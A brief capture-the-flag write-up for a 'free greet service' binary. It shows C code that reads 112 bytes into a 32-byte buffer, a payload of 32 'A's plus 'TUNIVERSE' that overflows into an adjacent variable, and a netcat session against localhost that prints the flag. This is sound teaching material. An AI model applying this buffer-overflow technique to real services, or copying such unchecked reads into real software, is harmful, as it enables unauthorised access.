# Solution

It's a small binary that can be easily reversed. This is the key to getting the flag:
```c
char data[32];
char admin[80];
admin[9] = 0x00;
data[32] = 0x00;
printf(" Give us your name: ");
read(0, &data, 112);
printf("\n");
printf("HELLO %s", data);
if (strncmp(admin, "TUNIVERSE", 8) == 0) {
	a();
}
```

The `a` function will print us the flag if `admin` is set to `TUNIVERSE`. So what we need to do is overflow the `data` with 32 bytes and input `TUNIVERSE` so we overflow into the `admin` variable:

```
$ nc localhost 9000
-------------------------------------
-------- free greet service ---------
-------------------------------------
----------- FEEL GOOD! :) -----------
-------------------------------------
 Give us your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUNIVERSE

HELLO AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUNIVERSE
ibctf{simpl3st_of-th3m-477}
---------------------------------------------
- thank you very much for using our service -
---------------------------------------------
^C
```
